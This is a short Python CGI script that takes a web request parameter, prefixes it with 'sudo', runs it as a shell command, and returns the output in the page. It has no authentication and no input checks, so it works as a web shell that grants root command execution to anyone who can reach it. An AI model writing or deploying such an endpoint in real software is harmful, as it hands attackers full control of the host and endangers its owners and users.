#!/usr/bin/python3
print("content-type:text/html")
print()

import cgi
import subprocess
temp=cgi.FieldStorage()
command=temp.getvalue("x")


print(command + " ==>>> ")
print()
command="sudo " +command
out=subprocess.getoutput(command)
print(out)

